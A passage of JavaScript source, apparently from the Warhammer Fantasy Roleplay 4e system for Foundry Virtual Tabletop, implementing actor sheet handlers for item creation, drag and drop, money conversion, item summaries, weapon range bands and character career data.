      let roles = foundry.utils.duplicate(this.actor.roles);
      let newRole = { name: game.i18n.localize("NewRole"), actor: "", test: "", testLabel: "" };
      roles.push(newRole);
      return this.actor.update({ "system.roles": roles })
    }

    // Conditional for creating skills from the skills tab - sets to the correct skill type depending on column
    if (ev.currentTarget.attributes["data-type"].value == "skill") {
      data = foundry.utils.mergeObject(data,
        {
          "system.advanced.value": ev.currentTarget.attributes["data-skill-type"].value
        });
    }

    if (data.type == "trapping")
      data = foundry.utils.mergeObject(data,
        {
          "system.trappingType.value": ev.currentTarget.attributes["item-section"].value
        });

    if (data.type == "ingredient") {
      data = foundry.utils.mergeObject(data,
        {
          "system.trappingType.value": "ingredient"
        });
      data.type = "trapping";
    }

    // Conditional for creating spells/prayers from their tabs, create the item with the correct type
    else if (data.type == "spell" || data.type == "prayer") {
      let itemSpecification = ev.currentTarget.attributes[`data-${data.type}-type`].value;

      if (data.type == "spell") {
        data = foundry.utils.mergeObject(data,
          {
            "system.lore.value": itemSpecification
          });
      }
      else if (data.type == "prayer") {
        data = foundry.utils.mergeObject(data,
          {
            "system.type.value": itemSpecification
          });
      }
    }
    data["img"] = "systems/wfrp4e/icons/blank.png";
    data["name"] = `${game.i18n.localize("New")} ${data.type.capitalize()}`;
    this.actor.createEmbeddedDocuments("Item", [data]);
  }

  _onDiagnoseToggle(ev)
  {
    let itemId = this._getId(ev);
    let item = this.actor.items.get(itemId);
    if (item)
    {
      item.update({"system.diagnosed" : !item.system.diagnosed});
    }
  }

  _onVehicleClick(ev)
  {
    this.actor.system.vehicle?.sheet.render(true);
  }

  async _onVehicleRemove(ev)
  {
    await this.actor.system.vehicle.update({"system.passengers.list" : this.actor.system.vehicle?.system.passengers.remove(this.actor.id)});
    this.render(true);
  }

  async _onAspectClick(ev)
  {
    let itemId = this._getId(ev);
    let aspect = this.actor.items.get(itemId);
    if (aspect && aspect.system.usable)
    {
      aspect.system.use();
    }
  }

  async _onApplyTargetEffect(event) {

    let applyData = {};
    let uuid = event.target.dataset.uuid;// || (event.target.dataset.lore ? "lore" : "")
    let effect = await fromUuid(uuid);
    if (effect) 
    {
      applyData = { effectData: [effect.convertToApplied()] };
    }
    else 
    {
      return ui.notifications.error("Unable to find effect to apply")
    }

    // let effect = actor.populateEffect(effectId, item, test)

    let targets = Array.from(game.user.targets).map(t => t.actor);    
    if (!(await effect.runPreApplyScript({targets})))
    {
      return
    }
    game.user.updateTokenTargets([]);
    game.user.broadcastActivity({ targets: [] });

    for (let target of targets) 
    {
      await target.applyEffect(applyData);
    }
  }

  async _onPlaceAreaEffect(event) {
    let effectUuid = event.currentTarget.dataset.uuid;
    let effect = await fromUuid(effectUuid);
    if (!(await effect.runPreApplyScript()))
    {
      return
    }
    let template = await AbilityTemplate.fromEffect(effectUuid);
    await template.drawPreview(event);
  }


  //#endregion


  //#region DRAG/DROP
  /**
   * Sets up the data transfer within a drag and drop ev. This is triggered
   * when the user starts dragging an inventory item, and dataTransfer is set to the 
   * relevant data needed by the _onDrop  See that for how drop events
   * are handled.
   * 
   * @private
   * 
   * @param {Object} ev    ev triggered by item dragging
   */
  _onDragStart(event) {
    const li = event.currentTarget;
    if ( event.target.classList.contains("content-link") ) return;

    // Create drag data
    let dragData;

    if (li.dataset.uuid)
    {
      let doc = fromUuidSync(li.dataset.uuid);
      dragData = doc.toDragData();
    }

    // Owned Items (assumed)
    else if ( li.dataset.id ) {
      const item = this.actor.items.get(li.dataset.id);
      dragData = item.toDragData();
    }

    // Owned Items (explicit)
    else if ( li.dataset.itemId ) {
      const item = this.actor.items.get(li.dataset.itemId);
      dragData = item.toDragData();
    }

    // Active Effect
    else if ( li.dataset.effectId ) {
      const effect = this.actor.effects.get(li.dataset.effectId);
      dragData = effect.toDragData();
    }

    if ( !dragData ) return;

    dragData.root = event.currentTarget.getAttribute("root");

    // Set data transfer
    event.dataTransfer.setData("text/plain", JSON.stringify(dragData));
  }

  /**
   * Handles all different types of drop events and processes the transfer data
   * for each type.
   * 
   * 
   * If you want to see how these (except inventory tab) drag events are generated, see the renderChatMessage hook
   * Besides containers, drag vents should be generated with a "type" and a "payload" at top level
   * 
   * type tells us what to do with the payload. 
   * Current types are: 
   * - generation (character generation drag and drop, which also includes generationType, telling us what stage was dragged)
   * - postedItem (item that was posted to chat)
   * - lookup (entity lookup, payload.lookupType tells us whether it's a skill or talent. Adds to the sheet)
   * - experience (payload is amount to add)
   * - wounds (payload is amount to add)
   *  
   * 
   * @private 
   * @param {Object} ev     ev triggered by item dropping
   */
  async _onDrop(ev) {
    let dragData = JSON.parse(ev.dataTransfer.getData("text/plain"));

    // Inventory Tab - Containers - Detected when you drop something onto a container, otherwise, move on to other drop types
    if ($(ev.target).parents(".item").attr("inventory-type") == "container")
      this._onDropIntoContainer(ev);

    // Dropping an item from chat
    else if (dragData.type == "postedItem")
      this.actor.createEmbeddedDocuments("Item", [dragData.payload]);

    else if (dragData.type == "generation")
      this._onDropCharGen(dragData);

    else if (dragData.type == "lookup")
      this._onDropLookupItem(dragData);

    else if (dragData.type == "experience")
      this._onDropExperience(dragData);

    else if (dragData.type == "money")
      this._onDropMoney(dragData);

    else if (dragData.type == "wounds")
      this.modifyWounds(`+${dragData.payload}`);

    else if (dragData.type == "condition")
      this.actor.addCondition(`${dragData.payload}`);

    else // If none of the above, just process whatever was dropped upstream
      super._onDrop(ev);
  }

  async _onDropIntoContainer(ev) {
    let dragData = JSON.parse(ev.dataTransfer.getData("text/plain"));
    let dropID = $(ev.target).parents(".item").attr("data-id");

    let item = (await Item.implementation.fromDropData(dragData))?.toObject();

    item.system.location.value = dropID; // Change location value of item to the id of the container it is in

    //  this will unequip/remove items like armor and weapons when moved into a container
    if (item.type == "armour")
      item.system.worn.value = false;
    if (item.type == "weapon")
      item.system.equipped = false;
    if (item.type == "trapping" && item.system.trappingType.value == "clothingAccessories")
      item.system.worn = false;


    return this.actor.updateEmbeddedDocuments("Item", [item]);
  }

  // Dropping a character creation result
  _onDropCharGen(dragData) {
    let data = foundry.utils.duplicate(this.actor._source);
    if (dragData.generationType == "attributes") // Characteristsics, movement, metacurrency, etc.
    {
      data.system.details.species.value = dragData.payload.species;
      data.system.details.species.subspecies = dragData.payload.subspecies;
      data.system.details.move.value = dragData.payload.movement;

      if (this.actor.type == "character") // Other actors don't care about these values
      {
        data.status.fate.value = dragData.payload.fate;
        data.status.fortune.value = dragData.payload.fate;
        data.status.resilience.value = dragData.payload.resilience;
        data.status.resolve.value = dragData.payload.resilience;
        data.system.details.experience.total += dragData.payload.exp;
        data.system.details.experience.log = this.actor._addToExpLog(dragData.payload.exp, "Character Creation", undefined, data.system.details.experience.total);
      }
      for (let c in game.wfrp4e.config.characteristics) {
        data.characteristics[c].initial = dragData.payload.characteristics[c].value;
      }
      return this.actor.update({ "data": data })
    }
    else if (dragData.generationType === "details") // hair, name, eyes
    {
      data.system.details.eyecolour.value = dragData.payload.eyes;
      data.system.details.haircolour.value = dragData.payload.hair;
      data.system.details.age.value = dragData.payload.age;
      data.system.details.height.value = dragData.payload.height;
      let name = dragData.payload.name;
      return this.actor.update({ "name": name, "data": data, "token.name": name.split(" ")[0] })
    }
  }

  // This is included in character creation, but not limited to.
  // lookupType is either skill or talent. Instead of looking up the
  // data on the drag ev (could cause a delay), look it up on drop
  async _onDropLookupItem(dragData) {
    let item;
    if (dragData.payload.lookupType === "skill") {
      // Advanced find  returns the skill the user expects it to return, even with skills not included in the compendium (Lore (whatever))
      item = await WFRP_Utility.findSkill(dragData.payload.name);
    }
    else if (dragData.payload.lookupType === "talent") {
      // Advanced find  returns the talent the user expects it to return, even with talents not included in the compendium (Etiquette (whatever))
      item = await WFRP_Utility.findTalent(dragData.payload.name);
    }
    else {
      item = await WFRP_Utility.findItem(dragData.payload.name, dragData.payload.lookupType);
    }
    if (item)
      this.actor.createEmbeddedDocuments("Item", [item.toObject()]);
  }

  // From character creation - exp drag values
  _onDropExperience(dragData) {
    let system = foundry.utils.duplicate(this.actor._source.system);
    system.details.experience.total += dragData.payload;
    system.details.experience.log = this.actor._addToExpLog(dragData.payload, "Character Creation", undefined, system.details.experience.total);
    this.actor.update({ "system": system });
  }

  // From Income results - drag money value over to add
  _onDropMoney(dragData) {
    // Money string is in the format of <amt><type>, so 12b, 5g, 1.5g
    let moneyString = dragData.payload;
    let type = moneyString.slice(-1);
    let amt;
    // Failure means divide by two, so mark whether we should add half a gold or half a silver, just round pennies
    let halfS = false, halfG = false;
    if (type === "b")
      amt = Math.round(moneyString.slice(0, -1));
    else if (type === "s") {
      if (moneyString.slice(0, -1).includes("."))
        halfS = true;
      amt = Math.floor(moneyString.slice(0, -1));
    }
    else if (type === "g") {
      if (moneyString.slice(0, -1).includes("."))
        halfG = true;
      amt = Math.floor(moneyString.slice(0, -1));
    }
    let money = this.actor.getItemTypes("money").map(m => m.toObject());

    let moneyItem;
    switch (type) {
      case 'b':
        moneyItem = money.find(i => i.name === game.i18n.localize("NAME.BP"));
        break;
      case 's':
        moneyItem = money.find(i => i.name === game.i18n.localize("NAME.SS"));
        break;
      case 'g':
        moneyItem = money.find(i => i.name === game.i18n.localize("NAME.GC"));
        break;
    }

    // If 0, means they failed the roll by -6 or more, delete all money
    if (!amt && !halfG && !halfS)
      money.forEach(m => m.system.quantity.value = 0);
    else // Otherwise, add amount to designated type
      moneyItem.system.quantity.value += amt;

    // add halves
    if (halfS)
      money.find(i => i.name === game.i18n.localize("NAME.BP")).system.quantity.value += 6;
    if (halfG)
      money.find(i => i.name === game.i18n.localize("NAME.SS")).system.quantity.value += 10;

    this.actor.updateEmbeddedDocuments("Item", money);
  }

  _onConvertCurrencyClick(ev) {
    let type = ev.currentTarget.dataset.type;
    let money = this.actor.getItemTypes("money").map(m => m.toObject());

    if (type == "gc")
    {
      let currentGC = money.find(i => i.name == game.i18n.localize("NAME.GC"));
      let currentSS = money.find(i => i.name == game.i18n.localize("NAME.SS"));

      if (currentGC && currentSS && currentGC.system.quantity.value )
      {
        currentGC.system.quantity.value -= 1;
        currentSS.system.quantity.value += 20;
        return this.actor.updateEmbeddedDocuments("Item", [currentGC, currentSS])
      }
      else
        return ui.notifications.error(game.i18n.localize("ErrorMoneyConvert"))
    }
    
    if (type == "ss")
    {
      let currentSS = money.find(i => i.name == game.i18n.localize("NAME.SS"));
      let currentBP = money.find(i => i.name == game.i18n.localize("NAME.BP"));

      if (currentBP && currentSS  && currentSS.system.quantity.value)
      {
        currentSS.system.quantity.value -= 1;
        currentBP.system.quantity.value += 12;
        return this.actor.updateEmbeddedDocuments("Item", [currentBP, currentSS])
      }
      else
        return ui.notifications.error(game.i18n.localize("ErrorMoneyConvert"))
    }

  }

  //#endregion

  //#region DROPDOWNS
  /**
   * All item types have a drop down description, this handles what is 
   * displayed for each item type and adds additional lities
   * and listeners.
   * 
   * @private
   * 
   * @param {Object} ev    ev generated by the click 
   */
  async _onItemSummary(ev) {
    ev.preventDefault();
    let li = $(ev.currentTarget).parents(".item"),
      item = this.actor.items.get(li.attr("data-id"));
    // Call the item's expandData() which gives us what to display
    let expandData = await item.system.expandData(
      {
        secrets: this.actor.isOwner
      });

    // Toggle expansion for an item
    if (li.hasClass("expanded")) // If expansion already shown - remove
    {
      let summary = li.children(".item-summary");
      summary.slideUp(200, () => summary.remove());
    }
    else {
      // Add a div with the item summary belowe the item
      let div = "";
      div = $(`<div class="item-summary">${expandData.description.value}</div>`);

      let props = $(`<div class="item-properties"></div>`);
      expandData.properties.forEach(p => props.append(`<span class="tag">${p}</span>`));


      div.append(props);

      // Allow 3rd party modules that add new Item SubTypes to add html elements freely,
      // without restricting them to description, tags and manual scripts
      if (expandData.other.length) {
        let other = $(`<div>${expandData.other}</div>`);
        div.append(other);
      }

      if (expandData.manualScripts.length) {
        let scriptButtons = expandData.manualScripts.map((s, i) => `<a class="trigger-script" data-index=${s.index} data-uuid=${s.effect?.uuid}>${s.Label}</a>`);
        let scripts = $(`<div>${scriptButtons}</div>`);
        div.append(scripts);
      }

      if (expandData.independentEffects.length)
      {
        let effectButtons = ``;
        for(let effect of expandData.independentEffects)
        {
          if (effect.isTargetApplied)
          {
            effectButtons += `<a class="apply-target-effect" data-uuid=${effect.uuid}><i class="fa-solid fa-crosshairs"></i> ${effect.name}</a>`;
          }
          else if (effect.isAreaApplied)
          {
            effectButtons += `<a class="place-area-effect" data-uuid=${effect.uuid}><i class="fa-solid fa-ruler-combined"></i> ${effect.name}</a>`;
          }
        }
        div.append(`<div>${effectButtons}</div>`);
      }


      li.append(div.hide());
      div.slideDown(200);

      this._dropdownListeners(div);
    }
    li.toggleClass("expanded");
  }


  async _toggleGroupAdvantageActions(ev) {
    let actions = $(ev.currentTarget).parents("form").find(".group-advantage-actions");

    if (actions.children().length == 0)
    {
      ev.currentTarget.children[0].classList.replace("fa-chevron-down", "fa-chevron-up");
      let html = ``;

      if (game.wfrp4e.config.groupAdvantageActions.length > 0)      
      {
        game.wfrp4e.config.groupAdvantageActions.forEach((action, i) => {
          html += `<div class="action">
          <a class="use-grp-adv" data-index="${i}">${action.name}</a>
          <p>${action.description}</p>
          <p class="cost"><strong>Cost</strong>: ${action.cost}</p>
          <p class="effect">${action.effect}</p>
          </div><hr>`;
        });
      }
      else 
      {
        html = "No Actions Available";
      }
      html = await TextEditor.enrichHTML(html, {async: true});
      let el = $(html).hide();
      actions.append(el);
      el.slideDown(200);
    }
    else 
    {
      actions.children().slideUp(200, () => actions.children().remove());
      
      ev.currentTarget.children[0].classList.replace("fa-chevron-up", "fa-chevron-down");
    }
  }



  async _onUseGrpAdvAction(ev) {
      let index = ev.currentTarget.dataset.index;

      let action = game.wfrp4e.config.groupAdvantageActions[index];

      if (action.cost > this.actor.status.advantage.value)
      {
        return ui.notifications.error("Not enough Advantage!")
      }

      if (action)
      {
        let html = await TextEditor.enrichHTML(`
        <p><strong>${action.name}</strong>: ${action.description}</p>
        <p>${action.effect}</p>
        `);

        this.actor.modifyAdvantage(-1 * action.cost);
        
        ChatMessage.create({
          content : html,
          speaker : {alias : this.actor.token?.name || this.actor.prototypeToken.name},
          flavor : "Group Advantage Action"
        });

        if (action.test)
        {
          if (action.test.type == "characteristic")
          {
            this.actor.setupCharacteristic(action.test.value).then(test => test.roll());
          }
        }
      }
  }


  _toggleSectionCollapse(ev)
  {
    let section = ev.currentTarget.dataset.section;
    let collapsed = this.actor.getFlag("wfrp4e", "sheetCollapsed")?.[section];

    this.actor.setFlag("wfrp4e", `sheetCollapsed.${section}`, !collapsed);
  }

  _toggleWeaponProperty(ev)
  {
    ev.stopPropagation();
    let item = this.actor.items.get(this._getId(ev));
    let index = ev.currentTarget.dataset.index;
    let inactive = Object.values(item.properties.inactiveQualities);

    // Find clicked quality
    let toggled = inactive[index];

    // Find currently active
    let qualities = foundry.utils.duplicate(item.system.qualities.value);

    // Disable all qualities of clicked group
    qualities.filter(i => i.group == toggled.group).forEach(i => i.active = false);

    // Enabled clicked quality
    qualities.find(i => i.name == toggled.key).active = true;

    item.update({"system.qualities.value" : qualities});
  }



  _dropdownListeners(html) {
    // Clickable tags
    // Post an Item Quality/Flaw
    html.on("click", ".item-property", ev => {
      WFRP_Utility.postProperty(ev.target.text);
    });

    // Roll a career income skill
    html.on("click", ".career-income", ev => {
      let skill = this.actor.getItemTypes("skill").find(i => i.name === ev.target.text.trim());
      let career = this.actor.items.get($(ev.target).attr("data-career-id"));
      if (!skill) {
        ui.notifications.error(game.i18n.localize("SHEET.SkillMissingWarning"));
        return;
      }
      if (!career.current.value) {
        ui.notifications.error(game.i18n.localize("SHEET.NonCurrentCareer"));
        return;
      }
      let options = {
        title: `${skill.name} - ${game.i18n.localize("Income")}`, 
        income: this.actor.details.status, 
        career: career.toObject()
      };
      this.actor.setupSkill(skill, options).then(setupData => {
        this.actor.basicTest(setupData);
      });
    });

    // Respond to template button clicks
    html.on("mousedown", '.aoe-template', ev => {

      let actorId = ev.target.dataset["actorId"];
      let itemId = ev.target.dataset["itemId"];

      AbilityTemplate.fromString(ev.target.text, actorId, itemId, false).drawPreview(ev);
      this.minimize();
    });
  }

  /**
   * Summary for specific property selected - like a Quality description in the combat tab.
   * Works also for "Special" and "Special Ammo" properties - user entered values in the item
   * sheets.
   * 
   * 
   * @private
   * @param {Object} ev    ev triggered by clicking on a wweapon/armor property
   */
  async _expandProperty(ev) {
    ev.preventDefault();

    let li = $(ev.currentTarget).parents(".item"),
      property = ev.target.text, // Proprety clicked on
      properties = foundry.utils.mergeObject(WFRP_Utility.qualityList(), WFRP_Utility.flawList()), // Property names
      propertyDescr = Object.assign(duplicate(game.wfrp4e.config.qualityDescriptions), game.wfrp4e.config.flawDescriptions); // Property descriptions
    
    let item = this.actor.items.get(li.attr("data-id")).toObject();

    // Add custom properties descriptions
    if (item)
    {
      let customProperties = item.system.qualities.value.concat(item.system.flaws.value).filter(i => i.custom);
      customProperties.forEach(p => {
        properties[p.key] = p.name;
        propertyDescr[p.key] = p.description;
      });
    }
    

    property = property.replace(/,/g, '').trim(); // Remove commas/whitespace

    let propertyKey = "";
    if (property == game.i18n.localize("Special Ammo")) // Special Ammo comes from user-entry in an Ammo's Special box
    {
      this.actor.items.get(li.attr("data-id")).toObject();
      let ammo = this.actor.items.get(item.system.currentAmmo.value).toObject();
      // Add the special value to the object so that it can be looked up
      propertyDescr = Object.assign(propertyDescr,
        {
          [game.i18n.localize("Special Ammo")]: ammo.system.special.value
        });
      propertyKey = game.i18n.localize("Special Ammo");
    }
    else if (property == "Special") // Special comes from user-entry in a Weapon's Special box
    {
      this.actor.items.get(li.attr("data-id"));
      // Add the special value to the object so that it can be looked up
      propertyDescr = Object.assign(propertyDescr,
        {
          "Special": item.system.special.value
        });
      propertyKey = "Special";
    }
    else // Otherwise, just lookup the key for the property and use that to lookup the description
    {
      propertyKey = WFRP_Utility.findKey(WFRP_Utility.parsePropertyName(property), properties);
    }

    let propertyDescription = "<b>" + property + "</b>" + ": " + propertyDescr[propertyKey];
    if (propertyDescription.includes("(Rating)"))
      propertyDescription = propertyDescription.replaceAll("(Rating)", property.split(" ")[1]);

    propertyDescription = await TextEditor.enrichHTML(propertyDescription, {async: true});

    // Toggle expansion 
    if (li.hasClass("expanded")) {
      let summary = li.children(".item-summary");
      summary.slideUp(200, () => summary.remove());
    }
    else {
      let div = $(`<div class="item-summary">${propertyDescription}</div>`);
      li.append(div.hide());
      div.slideDown(200);
    }
    li.toggleClass("expanded");
  }


  _onSortClick(ev)
  {
    let type = ev.currentTarget.dataset.type;

    type = type.includes(",") ? type.split(",") : [type];

    let items = type.reduce((prev, current) => prev.concat(this.actor.getItemTypes(current).map(i => i.toObject())), []);
    items = items.sort((a,b) => a.name < b.name ? -1 : 1);
    for(let i = 1; i < items.length; i++)
      items[i].sort = items[i-1].sort + 10000;

    return this.actor.updateEmbeddedDocuments("Item", items);
  }

  /**
   * Summary for specific property selected - like a Quality description in the combat tab.
   * Works also for "Special" and "Special Ammo" properties - user entered values in the item
   * sheets.
   * 
   * 
   * @private
   * @param {Object} ev    ev triggered by clicking on range, reach, etc.
   */
  _expandInfo(ev) {
    ev.preventDefault();
    let li = $(ev.currentTarget).parents(".item");
    let classes = $(ev.currentTarget);
    let expansionText = "";

    let item = this.actor.items.get(li.attr("data-id"));
    // Breakdown weapon range bands for easy reference (clickable, see below)
    if (classes.hasClass("weapon-range")) {
      if (!game.settings.get("wfrp4e", "mooRangeBands"))
      expansionText =
        `<a class="range-click" data-range="${item.range.bands[`${game.i18n.localize("Point Blank")}`].modifier}">${item.range.bands[`${game.i18n.localize("Point Blank")}`].range[0]} ${game.i18n.localize("yds")} - ${item.range.bands[`${game.i18n.localize("Point Blank")}`].range[1]} ${game.i18n.localize("yds")}: ${game.wfrp4e.config.difficultyLabels[game.wfrp4e.config.rangeModifiers["Point Blank"]]}</a><br>
          <a class="range-click" data-range="${item.range.bands[`${game.i18n.localize("Short Range")}`].modifier}">${item.range.bands[`${game.i18n.localize("Short Range")}`].range[0]} ${game.i18n.localize("yds")} - ${item.range.bands[`${game.i18n.localize("Short Range")}`].range[1]} ${game.i18n.localize("yds")}: ${game.wfrp4e.config.difficultyLabels[game.wfrp4e.config.rangeModifiers["Short Range"]]}</a><br>
          <a class="range-click" data-range="${item.range.bands[`${game.i18n.localize("Normal")}`].modifier}">${item.range.bands[`${game.i18n.localize("Normal")}`].range[0]} ${game.i18n.localize("yds")} - ${item.range.bands[`${game.i18n.localize("Normal")}`].range[1]} ${game.i18n.localize("yds")}: ${game.wfrp4e.config.difficultyLabels[game.wfrp4e.config.rangeModifiers["Normal"]]}</a><br>
          <a class="range-click" data-range="${item.range.bands[`${game.i18n.localize("Long Range")}`].modifier}">${item.range.bands[`${game.i18n.localize("Long Range")}`].range[0]} ${game.i18n.localize("yds")} - ${item.range.bands[`${game.i18n.localize("Long Range")}`].range[1]} ${game.i18n.localize("yds")}: ${game.wfrp4e.config.difficultyLabels[game.wfrp4e.config.rangeModifiers["Long Range"]]}</a><br>
          <a class="range-click" data-range="${item.range.bands[`${game.i18n.localize("Extreme")}`].modifier}">${item.range.bands[`${game.i18n.localize("Extreme")}`].range[0]} ${game.i18n.localize("yds")} - ${item.range.bands[`${game.i18n.localize("Extreme")}`].range[1]} ${game.i18n.localize("yds")}: ${game.wfrp4e.config.difficultyLabels[game.wfrp4e.config.rangeModifiers["Extreme"]]}</a><br>
          `;

      //@HOUSE
      else {
        game.wfrp4e.utility.logHomebrew("mooRangeBands");
        expansionText =
        `<a class="range-click" data-range="${item.range.bands[`${game.i18n.localize("Point Blank")}`].modifier}">${item.range.bands[`${game.i18n.localize("Point Blank")}`].range[0]} ${game.i18n.localize("yds")} - ${item.range.bands[`${game.i18n.localize("Point Blank")}`].range[1]} ${game.i18n.localize("yds")}: ${item.range.bands[`${game.i18n.localize("Point Blank")}`].modifier}</a><br>
          <a class="range-click" data-range="${item.range.bands[`${game.i18n.localize("Short Range")}`].modifier}">${item.range.bands[`${game.i18n.localize("Short Range")}`].range[0]} ${game.i18n.localize("yds")} - ${item.range.bands[`${game.i18n.localize("Short Range")}`].range[1]} ${game.i18n.localize("yds")}: ${item.range.bands[`${game.i18n.localize("Short Range")}`].modifier}</a><br>
          <a class="range-click" data-range="${item.range.bands[`${game.i18n.localize("Normal")}`].modifier}">${item.range.bands[`${game.i18n.localize("Normal")}`].range[0]} ${game.i18n.localize("yds")} - ${item.range.bands[`${game.i18n.localize("Normal")}`].range[1]} ${game.i18n.localize("yds")}: ${item.range.bands[`${game.i18n.localize("Normal")}`].modifier}</a><br>
          <a class="range-click" data-range="${item.range.bands[`${game.i18n.localize("Long Range")}`].modifier}">${item.range.bands[`${game.i18n.localize("Long Range")}`].range[0]} ${game.i18n.localize("yds")} - ${item.range.bands[`${game.i18n.localize("Long Range")}`].range[1]} ${game.i18n.localize("yds")}: ${item.range.bands[`${game.i18n.localize("Long Range")}`].modifier}</a><br>
          <a class="range-click" data-range="${item.range.bands[`${game.i18n.localize("Extreme")}`].modifier}">${item.range.bands[`${game.i18n.localize("Extreme")}`].range[0]} ${game.i18n.localize("yds")} - ${item.range.bands[`${game.i18n.localize("Extreme")}`].range[1]} ${game.i18n.localize("yds")}: ${item.range.bands[`${game.i18n.localize("Extreme")}`].modifier}</a><br>
          `;
      }
      //@/HOUSE

    }
    // Expand the weapon's group description
    else if (classes.hasClass("weapon-group")) {
      let weaponGroup = ev.target.text;
      let weaponGroupKey = "";
      weaponGroupKey = WFRP_Utility.findKey(weaponGroup, game.wfrp4e.config.weaponGroups);
      expansionText = game.wfrp4e.config.weaponGroupDescriptions[weaponGroupKey];
    }
    // Expand the weapon's reach description
    else if (classes.hasClass("weapon-reach")) {
      let reach = ev.target.text;
      let reachKey;
      reachKey = WFRP_Utility.findKey(reach, game.wfrp4e.config.weaponReaches);
      expansionText = game.wfrp4e.config.reachDescription[reachKey];
    }

    // Toggle expansion 
    if (li.hasClass("expanded")) {
      let summary = li.children(".item-summary");
      summary.slideUp(200, () => summary.remove());
    }
    else {
      let div = $(`<div class="item-summary">${expansionText}</div>`);
      li.append(div.hide());
      div.slideDown(200);

      // When a rangeband is clicked, start a test at that difficulty
      div.on("click", ".range-click", ev => {
        let modifier = parseInt($(ev.currentTarget).attr("data-range"));

        let weapon = item;
        if (weapon) {
          let options = {modify: { modifier } };
          this.actor.setupWeapon(weapon, options).then(setupData => {
            this.actor.weaponTest(setupData);
          });
        }
      });

    }
    li.toggleClass("expanded");
  }

  //#endregion

  /**
   * Duplicates an owned item given its id.
   * 
   * @param {Number} itemId   Item id of the item being duplicated
   */
  duplicateItem(itemId) {
    let item = this.actor.items.get(itemId).toObject();
    this.actor.createEmbeddedDocuments("Item", [item]);
  }

  async splitItem(itemId, amount) {
    let item = this.actor.items.get(itemId).toObject();
    let newItem = foundry.utils.duplicate(item);

    let oldQuantity = item.system.quantity.value;

    if (item.type == "cargo")
    {
      oldQuantity = item.system.encumbrance.value;
    }

    if (amount >= oldQuantity)
      return ui.notifications.notify(game.i18n.localize("Invalid Quantity"))

    if (item.type == "cargo")
    {
      newItem.system.encumbrance.value = amount;
      item.system.encumbrance.value -= amount;
    }
    else 
    {
      newItem.system.quantity.value = amount;
      item.system.quantity.value -= amount;
    }
    await this.actor.createEmbeddedDocuments("Item", [newItem]);
    this.actor.updateEmbeddedDocuments("Item", [item]);
  }


  toggleItemCheckbox(itemId, target) {
    let item = this.actor.items.get(itemId);
    return item.update({ [`${target}`]: !getProperty(item, target) })
  }
}

/**
 * Provides the specific interaction handlers for Character Sheets.
 *
 * ActorSheetWfrp4eCharacter are assigned to character type actors, and the specific interactions
 * character type actors need are defined here, specifically for careers and spending exp.
 * 
 */
class ActorSheetWfrp4eCharacter extends ActorSheetWfrp4e {
  static get defaultOptions() {
    const options = super.defaultOptions;
    foundry.utils.mergeObject(options,
      {
        classes: options.classes.concat(["wfrp4e", "actor", "character-sheet"]),
        width: 610,
        height: 740,
      });
    return options;
  }


  /**
   * Get the correct HTML template path to use for rendering this particular sheet
   * @type {String}
   */
  get template() {
    if (!game.user.isGM && this.actor.limited) return "systems/wfrp4e/templates/actors/actor-limited.hbs";
    return "systems/wfrp4e/templates/actors/character/character-sheet.hbs";

  }

   /**
   * Provides the data to the template when rendering the actor sheet
   * 
   * This is called when rendering the sheet, where it calls the base actor class
   * to organize, process, and prepare all actor data for display. See ActorWfrp4e.prepare()
   * 
   * @returns {Object} sheetData    Data given to the template when rendering
   */
  async getData() {
    const sheetData = await super.getData();

    this.addCharacterData(sheetData);

    return sheetData;
  }

  addCharacterData(sheetData) {

    sheetData.career = {
      untrainedSkills: [],
      untrainedTalents: [],
      currentClass: "",
      currentCareer: "",
      currentCareerGroup: "",
      status: "",
      hasCurrentCareer: false
    };

    // For each career, find the current one, and set the details accordingly (top of the character sheet)
    // Additionally, set available characteristics, skills, and talents to advance (advancement indicator)
    for (let career of sheetData.actor.getItemTypes("career")) {
      if (career.current.value) {
        sheetData.career.hasCurrentCareer = true; // Used to remove indicators if no current career

        // Setup Character detail values
        sheetData.career.currentClass = career.class.value;
        sheetData.career.currentCareer = career.name;
        sheetData.career.currentCareerGroup = career.careergroup.value;

        if (!sheetData.actor.details.status.value) // backwards compatible with moving this to the career change handler
          sheetData.career.status = game.wfrp4e.config.statusTiers[career.status.tier] + " " + career.status.standing;

        // Setup advancement indicators for characteristics
        let availableCharacteristics = career.characteristics;
        for (let char in sheetData.system.characteristics) {
          if (availableCharacteristics.includes(char)) {
            sheetData.system.characteristics[char].career = true;
            if (sheetData.system.characteristics[char].advances >= career.level.value * 5) {
              sheetData.system.characteristics[char].complete = true;
            }
          }
        }

        // Find skills that have been trained or haven't, add advancement indicators or greyed out options (untrainedSkills)
        for (let sk of career.skills) {
          let trainedSkill = sheetData.actor.getItemTypes("skill").find(s => s.name.toLowerCase() == sk.toLowerCase());
          if (trainedSkill) 
            trainedSkill.system._addCareerData(career);
          else 
            sheetData.career.untrainedSkills.push(sk);
          
        }

        // Find talents that have been trained or haven't, add advancement button or greyed out options (untrainedTalents)
        for (let talent of career.talents) {
          let trainedTalent = sheetData.actor.getItemTypes("talent").find(t => t.name == talent);
          if (trainedTalent) 
            trainedTalent.system._addCareerData(career);
          else 
            sheetData.career.untrainedTalents.push(talent);
          
        }
      }
    }

    sheetData.system.details.experience.log.forEach((entry, i) => { entry.index = i; });
    sheetData.experienceLog = this._condenseXPLog(sheetData);

    sheetData.system.details.experience.canEdit = game.user.isGM || game.settings.get("wfrp4e", "playerExperienceEditing");
  }



  
  _condenseXPLog(sheetData) {
    let condensed= [];
    for (
      let logIndex = 0, lastPushed, lastPushedCounter = 0;
      logIndex < sheetData.system.details.experience.log.length;
      logIndex++) {
      let condense = false;
      if ( // If last pushed exists, and is the same, type, same reason, and both are positiev or both are negative
        lastPushed &&
        lastPushed.type == sheetData.system.details.experience.log[logIndex].type &&
        lastPushed.reason == sheetData.system.details.experience.log[logIndex].reason &&
        ((lastPushed.amount >= 0 && sheetData.system.details.experience.log[logIndex].amount >= 0)
          || (lastPushed.amount <= 0 && sheetData.system.details.experience.log[logIndex].amount <= 0))) { condense = true; }

      if (condense) {
        lastPushed[lastPushed.type] = sheetData.system.details.experience.log[logIndex][lastPushed.type];
        lastPushed.amount += sheetData.system.details.experience.log[logIndex].amount;
        lastPushed.index = sheetData.system.details.experience.log[logIndex].index;
        lastPushed.spent = sheetData.system.details.experience.log[logIndex].spent;
        lastPushed.total = sheetData.system.details.experience.log[logIndex].total;
        lastPushed.counter++;
      }
      else {
        lastPushed = foundry.utils.duplicate(sheetData.system.details.experience.log[logIndex]);
        lastPushed.counter = 1;
        condensed.push(lastPushed);
        lastPushedCounter = 0;

      }
    }
